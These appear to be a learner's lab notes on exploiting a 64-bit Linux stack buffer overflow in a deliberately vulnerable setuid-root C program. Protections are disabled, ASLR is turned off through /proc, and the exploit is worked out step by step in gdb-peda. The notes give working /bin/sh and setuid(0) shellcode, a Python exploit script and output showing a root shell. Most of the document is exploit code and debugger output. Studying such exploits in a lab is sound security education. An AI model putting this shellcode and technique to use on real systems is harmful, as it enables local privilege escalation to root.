## Sources

* [STACK BASED BUFFER OVERFLOW ON 64 BIT LINUX](https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html)
* [Proj 13: 64-Bit Buffer Overflow Exploit (15 pts.)](https://samsclass.info/127/proj/p13-64bo.htm)
* [Buffer overflow works in gdb but not without it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it) 
* [64-bit Linux stack smashing tutorial: Part 1](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1//)
* [x86-64 (Wikipedia)](https://en.wikipedia.org/wiki/X86-64)
* [Introduction to x64 Assembly (from Intel)](https://software.intel.com/en-us/articles/introduction-to-x64-assembly)

## Scripts

```shell
Get root from shellcode on payload. Not on environment variable

gdb-peda$ q
ubuntu@ubuntu:~/smash$ cat buf.c 
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
char buf[100];
strcpy(buf,argv[1]);
printf("Input was: %s\n",buf);
return 0;
}

gcc -no-pie -fno-stack-protector -z execstack buf.c -o buf 

sudo chown root buf
sudo chmod +s buf

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400537 <+0>:   push   rbp
   0x0000000000400538 <+1>:   mov    rbp,rsp
   0x000000000040053b <+4>:   add    rsp,0xffffffffffffff80
   0x000000000040053f <+8>:   mov    DWORD PTR [rbp-0x74],edi
   0x0000000000400542 <+11>:  mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000400546 <+15>:  mov    rax,QWORD PTR [rbp-0x80]
   0x000000000040054a <+19>:  add    rax,0x8
   0x000000000040054e <+23>:  mov    rdx,QWORD PTR [rax]
   0x0000000000400551 <+26>:  lea    rax,[rbp-0x70]
   0x0000000000400555 <+30>:  mov    rsi,rdx
   0x0000000000400558 <+33>:  mov    rdi,rax
   0x000000000040055b <+36>:  call   0x400430 <strcpy@plt>
   0x0000000000400560 <+41>:  lea    rax,[rbp-0x70]
   0x0000000000400564 <+45>:  mov    rsi,rax
   0x0000000000400567 <+48>:  lea    rdi,[rip+0x96]        # 0x400604
   0x000000000040056e <+55>:  mov    eax,0x0
   0x0000000000400573 <+60>:  call   0x400440 <printf@plt>
   0x0000000000400578 <+65>:  mov    eax,0x0
   0x000000000040057d <+70>:  leave  
   0x000000000040057e <+71>:  ret    
End of assembler dump.


b *main+71


r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")

Breakpoint 1, 0x000000000040057e in main ()
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$ 

gdb-peda$ aslr
ASLR is OFF
gdb-peda$ 


gdb-peda$ x/60x $rsp-200
0x7ffde0c02a30:   0x0000000000000000   0x0000000000000000
0x7ffde0c02a40:   0x0000000000000000   0x00007ffde0c02a70
0x7ffde0c02a50:   0x0000000000000000   0x00007f9d5b3dd170
0x7ffde0c02a60:   0x0000000000000001   0x0000000000400578
0x7ffde0c02a70:   0x00007ffde0c02bd8   0x0000000200000000
0x7ffde0c02a80:   0x4141414141414141   0x4141414141414141
0x7ffde0c02a90:   0x4141414141414141   0x4141414141414141
0x7ffde0c02aa0:   0x4141414141414141   0x4141414141414141
0x7ffde0c02ab0:   0x4141414141414141   0x4141414141414141
0x7ffde0c02ac0:   0x4141414141414141   0xd231485041414141
0x7ffde0c02ad0:   0x69622fbb48f63148   0x5f545368732f2f6e
0x7ffde0c02ae0:   0x41414141050f3bb0   0x4141414141414141
0x7ffde0c02af0:   0x4242424242424242   0x0000434343434343
0x7ffde0c02b00:   0x0000000000000002   0x00007ffde0c02bd8
0x7ffde0c02b10:   0x0000000200008000   0x0000000000400537
0x7ffde0c02b20:   0x0000000000000000   0x9f4d609aa9c6f6b5
0x7ffde0c02b30:   0x0000000000400450   0x00007ffde0c02bd0
0x7ffde0c02b40:   0x0000000000000000   0x0000000000000000
0x7ffde0c02b50:   0x60b6a19af4c6f6b5   0x6077d5a63458f6b5
0x7ffde0c02b60:   0x00007ffd00000000   0x0000000000000000
0x7ffde0c02b70:   0x0000000000000000   0x00007f9d5b1c4733
0x7ffde0c02b80:   0x00007f9d5b1aa638   0x000000001bb72448
0x7ffde0c02b90:   0x0000000000000000   0x0000000000000000
0x7ffde0c02ba0:   0x0000000000000000   0x0000000000400450
0x7ffde0c02bb0:   0x00007ffde0c02bd0   0x000000000040047a
0x7ffde0c02bc0:   0x00007ffde0c02bc8   0x000000000000001c
0x7ffde0c02bd0:   0x0000000000000002   0x00007ffde0c032de
0x7ffde0c02be0:   0x00007ffde0c032f5   0x0000000000000000
0x7ffde0c02bf0:   0x00007ffde0c03374   0x00007ffde0c03960
0x7ffde0c02c00:   0x00007ffde0c03992   0x00007ffde0c039b4


r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")


sudo nano /proc/sys/kernel/randomize_va_space
set 2 to 0. Set it back again to 2 ,to turn on aslr. 

always turn off aslr - after restart. although the binary is compiled with aslr off, when server restart, the aslr is turned on again

after manual alsr off

first run 

gdb-peda$  x/60x $rsp-200
0x7fffffffdee0:   0x0000000000000000   0x0000000000000000
0x7fffffffdef0:   0x0000000000000000   0x0000000000000000
0x7fffffffdf00:   0x0000000000000000   0x00007ffff7ffe170
0x7fffffffdf10:   0x0000000000000001   0x0000000000400578
0x7fffffffdf20:   0x00007fffffffe088   0x0000000200000000
0x7fffffffdf30:   0x4141414141414141   0x4141414141414141
0x7fffffffdf40:   0x4141414141414141   0x4141414141414141
0x7fffffffdf50:   0x4141414141414141   0x4141414141414141
0x7fffffffdf60:   0x4141414141414141   0x4141414141414141
0x7fffffffdf70:   0x4141414141414141   0xd231485041414141
0x7fffffffdf80:   0x69622fbb48f63148   0x5f545368732f2f6e
0x7fffffffdf90:   0x41414141050f3bb0   0x4141414141414141
0x7fffffffdfa0:   0x4242424242424242   0x0000434343434343
0x7fffffffdfb0:   0x0000000000000002   0x00007fffffffe088
0x7fffffffdfc0:   0x0000000200008000   0x0000000000400537
0x7fffffffdfd0:   0x0000000000000000   0x385b4fd1a1957d8c
0x7fffffffdfe0:   0x0000000000400450   0x00007fffffffe080
0x7fffffffdff0:   0x0000000000000000   0x0000000000000000
0x7fffffffe000:   0xc7a4b0ae15f57d8c   0xc7a4a0111c0b7d8c
0x7fffffffe010:   0x00007fff00000000   0x0000000000000000
0x7fffffffe020:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe030:   0x00007ffff7dcb638   0x000000001f887fb7
0x7fffffffe040:   0x0000000000000000   0x0000000000000000
0x7fffffffe050:   0x0000000000000000   0x0000000000400450
0x7fffffffe060:   0x00007fffffffe080   0x000000000040047a
0x7fffffffe070:   0x00007fffffffe078   0x000000000000001c
0x7fffffffe080:   0x0000000000000002   0x00007fffffffe2de
0x7fffffffe090:   0x00007fffffffe2f5   0x0000000000000000
0x7fffffffe0a0:   0x00007fffffffe374   0x00007fffffffe960
0x7fffffffe0b0:   0x00007fffffffe992   0x00007fffffffe9b4

gdb buf
b *main+71
r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")

Breakpoint 1, 0x000000000040057e in main ()
gdb-peda$  x/60x $rsp-200
0x7fffffffdee0:   0x0000000000000000   0x0000000000000000
0x7fffffffdef0:   0x0000000000000000   0x0000000000000000
0x7fffffffdf00:   0x0000000000000000   0x00007ffff7ffe170
0x7fffffffdf10:   0x0000000000000001   0x0000000000400578
0x7fffffffdf20:   0x00007fffffffe088   0x0000000200000000
0x7fffffffdf30:   0x4141414141414141   0x4141414141414141
0x7fffffffdf40:   0x4141414141414141   0x4141414141414141
0x7fffffffdf50:   0x4141414141414141   0x4141414141414141
0x7fffffffdf60:   0x4141414141414141   0x4141414141414141
0x7fffffffdf70:   0x4141414141414141   0xd231485041414141
0x7fffffffdf80:   0x69622fbb48f63148   0x5f545368732f2f6e
0x7fffffffdf90:   0x41414141050f3bb0   0x4141414141414141
0x7fffffffdfa0:   0x4242424242424242   0x0000434343434343
0x7fffffffdfb0:   0x0000000000000002   0x00007fffffffe088
0x7fffffffdfc0:   0x0000000200008000   0x0000000000400537
0x7fffffffdfd0:   0x0000000000000000   0x85fd9322af80277a
0x7fffffffdfe0:   0x0000000000400450   0x00007fffffffe080
0x7fffffffdff0:   0x0000000000000000   0x0000000000000000
0x7fffffffe000:   0x7a026c5d1be0277a   0x7a027ce2121e277a
0x7fffffffe010:   0x00007fff00000000   0x0000000000000000
0x7fffffffe020:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe030:   0x00007ffff7dcb638   0x000000001b5cc6ca
0x7fffffffe040:   0x0000000000000000   0x0000000000000000
0x7fffffffe050:   0x0000000000000000   0x0000000000400450
0x7fffffffe060:   0x00007fffffffe080   0x000000000040047a
0x7fffffffe070:   0x00007fffffffe078   0x000000000000001c
0x7fffffffe080:   0x0000000000000002   0x00007fffffffe2de
0x7fffffffe090:   0x00007fffffffe2f5   0x0000000000000000
0x7fffffffe0a0:   0x00007fffffffe374   0x00007fffffffe960
0x7fffffffe0b0:   0x00007fffffffe992   0x00007fffffffe9b4
gdb-peda$ 

The out is same. I will use 0x7fffffffdf40

Changing to nop \x90 and  0x7f ff ff ff df 40 \x40\xdf\xff\xff\xff\x7f


r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x40\xdf\xff\xff\xff\x7f'")

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Input was: ", '\220' <repeats 76 times>, "PH1\322H1\366H\273/bin//shST_\260;\017\005", 'A' <repeats 12 times>, "BBBBBBBB@\337\377\377\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdfa8 --> 0x7fffffffdf40 --> 0x9090909090909090 
RIP: 0x40057e (<main+71>:  ret)
R8 : 0x0 
R9 : 0x7e ('~')
R10: 0xffffff82 
R11: 0x246 
R12: 0x400450 (<_start>:   xor    ebp,ebp)
R13: 0x7fffffffe080 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400573 <main+60>:  call   0x400440 <printf@plt>
   0x400578 <main+65>:  mov    eax,0x0
   0x40057d <main+70>:  leave  
=> 0x40057e <main+71>:  ret    
   0x40057f:   nop
   0x400580 <__libc_csu_init>:   push   r15
   0x400582 <__libc_csu_init+2>: push   r14
   0x400584 <__libc_csu_init+4>: mov    r15,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfa8 --> 0x7fffffffdf40 --> 0x9090909090909090 
0008| 0x7fffffffdfb0 --> 0x2 
0016| 0x7fffffffdfb8 --> 0x7fffffffe088 --> 0x7fffffffe2de ("/home/ubuntu/smash/buf")
0024| 0x7fffffffdfc0 --> 0x200008000 
0032| 0x7fffffffdfc8 --> 0x400537 (<main>:   push   rbp)
0040| 0x7fffffffdfd0 --> 0x0 
0048| 0x7fffffffdfd8 --> 0xb47604602662e8c8 
0056| 0x7fffffffdfe0 --> 0x400450 (<_start>: xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040057e in main ()

gdb-peda$  x/60x $rsp-200
0x7fffffffdee0:   0x0000000000000000   0x0000000000000000
0x7fffffffdef0:   0x0000000000000000   0x0000000000000000
0x7fffffffdf00:   0x0000000000000000   0x00007ffff7ffe170
0x7fffffffdf10:   0x0000000000000001   0x0000000000400578
0x7fffffffdf20:   0x00007fffffffe088   0x0000000200000000
0x7fffffffdf30:   0x9090909090909090   0x9090909090909090
0x7fffffffdf40:   0x9090909090909090   0x9090909090909090
0x7fffffffdf50:   0x9090909090909090   0x9090909090909090
0x7fffffffdf60:   0x9090909090909090   0x9090909090909090
0x7fffffffdf70:   0x9090909090909090   0xd231485090909090
0x7fffffffdf80:   0x69622fbb48f63148   0x5f545368732f2f6e
0x7fffffffdf90:   0x41414141050f3bb0   0x4141414141414141
0x7fffffffdfa0:   0x4242424242424242   0x00007fffffffdf40
0x7fffffffdfb0:   0x0000000000000002   0x00007fffffffe088
0x7fffffffdfc0:   0x0000000200008000   0x0000000000400537
0x7fffffffdfd0:   0x0000000000000000   0xb47604602662e8c8
0x7fffffffdfe0:   0x0000000000400450   0x00007fffffffe080
0x7fffffffdff0:   0x0000000000000000   0x0000000000000000
0x7fffffffe000:   0x4b89fb1f9202e8c8   0x4b89eba09bfce8c8
0x7fffffffe010:   0x00007fff00000000   0x0000000000000000
0x7fffffffe020:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe030:   0x00007ffff7dcb638   0x000000001b3def06
0x7fffffffe040:   0x0000000000000000   0x0000000000000000
0x7fffffffe050:   0x0000000000000000   0x0000000000400450
0x7fffffffe060:   0x00007fffffffe080   0x000000000040047a
0x7fffffffe070:   0x00007fffffffe078   0x000000000000001c
0x7fffffffe080:   0x0000000000000002   0x00007fffffffe2de
0x7fffffffe090:   0x00007fffffffe2f5   0x0000000000000000
0x7fffffffe0a0:   0x00007fffffffe374   0x00007fffffffe960
0x7fffffffe0b0:   0x00007fffffffe992   0x00007fffffffe9b4
gdb-peda$ 

gdb-peda$ c
Continuing.
process 15778 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ 

ubuntu@ubuntu:~/smash$ ./buf `python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x40\xdf\xff\xff\xff\x7f'"`
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB@????
Segmentation fault (core dumped)
ubuntu@ubuntu:~/smash$ 

cannot get shell using payload - 

Proj 13: 64-Bit Buffer Overflow Exploit (15 pts.) - https://samsclass.info/127/proj/p13-64bo.htm

Buffer overflow works in gdb but not without it -  https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it 

#!/usr/bin/env python

import os

for param in os.environ.keys():
    print "%20s %s" % (param,os.environ[param])

python environ.py
unset SHELLCODE

ubuntu@ubuntu:~/smash$ python environ.py 
            LESSOPEN | /usr/bin/lesspipe %s
          SSH_CLIENT 192.168.0.25 49765 22
             LOGNAME ubuntu
                USER ubuntu
                HOME /home/ubuntu
                PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
                LANG en_US.UTF-8
                TERM xterm-256color
               SHELL /bin/bash
       XDG_DATA_DIRS /usr/local/share:/usr/share:/var/lib/snapd/desktop
     XDG_RUNTIME_DIR /run/user/1000
            S_COLORS auto
      XDG_SESSION_ID 4
                   _ /usr/bin/python
           LS_COLORS rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
           LESSCLOSE /usr/bin/lesspipe %s %s
             SSH_TTY /dev/pts/0
              OLDPWD /home/ubuntu
               SHLVL 1
                 PWD /home/ubuntu/smash
                MAIL /var/mail/ubuntu
      SSH_CONNECTION 192.168.0.25 49765 192.168.0.35 22

22 including python _ 

gdb-peda$ show env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.0.25 49765 192.168.0.35 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/ubuntu
S_COLORS=auto
XDG_SESSION_ID=4
USER=ubuntu
PWD=/home/ubuntu/smash
HOME=/home/ubuntu
SSH_CLIENT=192.168.0.25 49765 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/ubuntu
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LOGNAME=ubuntu
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/gdb
LINES=38
COLUMNS=143

24 including _ gdb and LINES and COLUMNS


export additional variables so it matches gdb. 

export LINES=38
export COLUMNS=143

gdb-peda$  x/60x $rsp-200
0x7fffffffe3a0:   0x9090909090909090   0x9090909090909090
0x7fffffffe3b0:   0x9090909090909090   0xd231485090909090
0x7fffffffe3c0:   0x69622fbb48f63148   0x5f545368732f2f6e
0x7fffffffe3d0:   0x41414141050f3bb0   0x4141414141414141
0x7fffffffe3e0:   0x4242424242424242   0x00007fffffffdf40
0x7fffffffe3f0:   0x0000000000000002   0x00007fffffffe4c8
0x7fffffffe400:   0x0000000200008000   0x0000000000400537
0x7fffffffe410:   0x0000000000000000   0x13c267d6a2887784
0x7fffffffe420:   0x0000000000400450   0x00007fffffffe4c0
0x7fffffffe430:   0x0000000000000000   0x0000000000000000
0x7fffffffe440:   0xec3d98a96e687784   0xec3d88161f167784
0x7fffffffe450:   0x00007fff00000000   0x0000000000000000
0x7fffffffe460:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe470:   0x00007ffff7dcb638   0x000000001b51f9b7
0x7fffffffe480:   0x0000000000000000   0x0000000000000000
0x7fffffffe490:   0x0000000000000000   0x0000000000400450
0x7fffffffe4a0:   0x00007fffffffe4c0   0x000000000040047a
0x7fffffffe4b0:   0x00007fffffffe4b8   0x000000000000001c
0x7fffffffe4c0:   0x0000000000000002   0x00007fffffffe701
0x7fffffffe4d0:   0x00007fffffffe718   0x0000000000000000
0x7fffffffe4e0:   0x00007fffffffe797   0x00007fffffffed83
0x7fffffffe4f0:   0x00007fffffffedb5   0x00007fffffffedd7
gdb-peda$ q

Used 0x7fffffffe3b0

ubuntu@ubuntu:~/smash$ cat exploit.py 
from subprocess import call
nop='\x90'*76     #nop sled
shellcode='\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
junk='A'*12+'B'*8
ret='0x7fffffffe3b0'    #return address
return_addr=(ret[2:].decode('hex'))[::-1] #convert return address to little endian.
payload = nop + shellcode + junk + return_addr  #final payload
call(['./buf',payload])    #execute program with payload as argument
ubuntu@ubuntu:~/smash$ 


ubuntu@ubuntu:~/smash$ pico exploit.py 
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
ubuntu@ubuntu:~/smash$ pico exploit.py 
ubuntu@ubuntu:~/smash$ python exploit.py 
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB?????
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
$ whoami
ubuntu
$ 

try to unset LINES and COLUMNS. still works

unset LINES
unset COLUMNS

with setuid shellcode to get root


r $(python -c "print '\x90'*52+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'+'A'*12+'B'*8+'\x40\xdf\xff\xff\xff\x7f'")

gdb-peda$ x/60x $rsp-200
0x7fffffffe320:   0x0000000000000000   0x0000000000000000
0x7fffffffe330:   0x0000000000000000   0x0000000000000000
0x7fffffffe340:   0x0000000000000000   0x00007ffff7ffe170
0x7fffffffe350:   0x0000000000000001   0x0000000000400578
0x7fffffffe360:   0x00007fffffffe4c8   0x0000000200000000
0x7fffffffe370:   0x9090909090909090   0x9090909090909090
0x7fffffffe380:   0x9090909090909090   0x9090909090909090
0x7fffffffe390:   0x9090909090909090   0x9090909090909090
0x7fffffffe3a0:   0xb0ff314890909090   0xbb48d23148050f69
0x7fffffffe3b0:   0x68732f6e69622fff   0xe789485308ebc148
0x7fffffffe3c0:   0xe689485750c03148   0x6a5f016a050f3bb0
0x7fffffffe3d0:   0x41414141050f583c   0x4141414141414141
0x7fffffffe3e0:   0x4242424242424242   0x00007fffffffdf40
0x7fffffffe3f0:   0x0000000000000002   0x00007fffffffe4c8
0x7fffffffe400:   0x0000000200008000   0x0000000000400537
0x7fffffffe410:   0x0000000000000000   0x8f8a458f63bbe0c8
0x7fffffffe420:   0x0000000000400450   0x00007fffffffe4c0
0x7fffffffe430:   0x0000000000000000   0x0000000000000000
0x7fffffffe440:   0x7075baf0af5be0c8   0x7075aa4fde25e0c8
0x7fffffffe450:   0x00007fff00000000   0x0000000000000000
0x7fffffffe460:   0x0000000000000000   0x00007ffff7de5733
0x7fffffffe470:   0x00007ffff7dcb638   0x000000001b657cc0
0x7fffffffe480:   0x0000000000000000   0x0000000000000000
0x7fffffffe490:   0x0000000000000000   0x0000000000400450
0x7fffffffe4a0:   0x00007fffffffe4c0   0x000000000040047a
0x7fffffffe4b0:   0x00007fffffffe4b8   0x000000000000001c
0x7fffffffe4c0:   0x0000000000000002   0x00007fffffffe701
0x7fffffffe4d0:   0x00007fffffffe718   0x0000000000000000
0x7fffffffe4e0:   0x00007fffffffe797   0x00007fffffffed83
0x7fffffffe4f0:   0x00007fffffffedb5   0x00007fffffffedd7
gdb-peda$ 


0x7fffffffe390
0x7f ff ff ff e3 90

r $(python -c "print '\x90'*52+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'+'A'*12+'B'*8+'\x90\xe3\xff\xff\xff\x7f'")


gdb-peda$ c
Continuing.
process 16058 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ 

$ id
[New process 16072]
Error in re-setting breakpoint 1: No symbol "main" in current context.
process 16072 is executing new program: /usr/bin/id
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
$ [Inferior 2 (process 16072) exited normally]
Warning: not running

export LINES=38
export COLUMNS=143

ubuntu@ubuntu:~/smash$ python setuid.py 
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB?????
# whoami
root
# id
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# 

mis-alingment happens

ubuntu@ubuntu:~/smash$ unset LINES
ubuntu@ubuntu:~/smash$ unset COLUMNS
